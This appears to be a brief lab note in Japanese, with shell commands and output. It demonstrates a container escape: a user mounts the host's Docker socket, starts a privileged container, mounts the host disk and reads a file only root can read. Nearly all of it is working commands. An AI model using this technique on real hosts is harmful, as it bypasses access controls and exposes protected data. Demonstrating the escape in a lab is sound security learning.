## /rootに検証用のファイルを作成

```bash
banister@~/projects/OreshicRecord vuln$ echo 'root only'
```

```
root only
```

## 一般ユーザーでは開けないことの確認

```bash
banister@~/projects/OreshicRecord vuln$ cat /root/secret.txt
```

```
cat: /root/secret.txt: 許可がありません
```

## DockerAPIをソケットで渡してコンテナ起動

```bash
banister@~/projects/OreshicRecord vuln$ docker run -it -v /var/run/docker.sock:/var/run/docker.sock docker:cli
```

```
#-- ホストのコンテナ一覧が見える(コンテナ内でホストのDockerAPIが利用できる)
docker ps
CONTAINER ID   IMAGE        COMMAND                  CREATED         STATUS         PORTS     NAMES
ead797223f4d   docker:cli   "docker-entrypoint.s…"   4 seconds ago   Up 4 seconds             focused_grothendieck

#-- コンテナ内でほぼホスト同様の権限のコンテナを更に起動
# docker run --privileged -it ubuntu

#-- ホストのデバイスが見える
root@451a56c8498f:/# lsblk
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
sda      8:0    0   200G  0 disk 
|-sda1   8:1    0     1M  0 part 
|-sda2   8:2    0   513M  0 part 
`-sda3   8:3    0 199.5G  0 part /etc/hosts
                                 /etc/hostname
                                 /etc/resolv.conf
sr0     11:0    1  1024M  0 rom  

#-- ホストのデバイスをマウント
root@451a56c8498f:/# mount /dev/sda3 /mnt

root@451a56c8498f:/# ls /mnt
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var

root@451a56c8498f:/# cat /mnt/root/secret.txt 
root only
```
